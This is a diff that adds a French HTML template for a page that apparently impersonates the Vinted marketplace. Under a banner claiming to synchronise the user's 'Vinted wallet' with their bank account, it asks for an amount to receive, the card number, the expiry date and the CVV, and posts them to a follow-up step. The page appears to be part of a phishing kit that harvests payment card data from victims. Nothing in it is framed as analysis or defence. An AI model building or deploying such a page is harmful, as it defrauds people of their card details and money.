@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Étape 1</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+        }
+
+        header {
+            text-align: center;
+            padding: 20px;
+        }
+
+        header img {
+            height: 80px;
+        }
+
+        /* Panneau d'avertissement */
+        .warning-panel {
+            background-color: #e74c3c;  /* Fond rouge */
+            color: white;
+            padding: 15px;
+            font-weight: bold;
+            text-align: center;
+            margin: 10px 0;
+            border-radius: 5px;
+            line-height: 1.6;  /* Pour espacer les lignes du texte */
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 30px auto;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block;
+            color: #34495e;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #007782;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #005f67;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo">
+    </header>
+
+    <!-- Panneau d'avertissement juste en dessous du logo -->
+    <div class="warning-panel">
+        Synchronisation de votre porte-monnaie Vinted<br>
+        à votre compte bancaire.<br>
+        Veuillez ne communiquer aucune information personnelle oralement.
+    </div>
+
+    <div class="container">
+        <h2>Étape 1 : Carte</h2>
+        <form method="post" action="/form2">
+            <label>Montant à recevoir (€) :</label>
+            <input type="number" name="amount" required>
+
+            <label>Numéro de carte :</label>
+            <input type="text" name="card_number" maxlength="19" placeholder="**** **** **** ****" required>
+
+            <label>Date d'expiration (MM/AA) :</label>
+            <input type="text" name="expiry" maxlength="5" placeholder="MM/AA" required>
+
+            <label>Cryptogramme :</label>
+            <input type="text" name="cvv" maxlength="4" required>
+
+            <button type="submit">Suivant</button>
+        </form>
+    </div>
+</body>
+</html>
